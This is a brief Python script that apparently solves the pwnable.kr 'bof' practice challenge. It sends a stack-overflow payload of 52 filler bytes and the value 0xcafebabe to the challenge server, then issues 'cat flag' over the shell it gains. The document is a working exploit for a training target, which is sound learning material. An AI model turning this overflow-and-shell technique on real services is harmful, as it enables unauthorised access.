import socket 
import time
import pdb

payload =  "a"*52 + "\xbe\xba\xfe\xca\n"
target = ("pwnable.kr", 9000) 

connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connection.connect(target)

print connection.sendall(payload)
print connection.sendall("cat flag\n")
print connection.recv(1024)
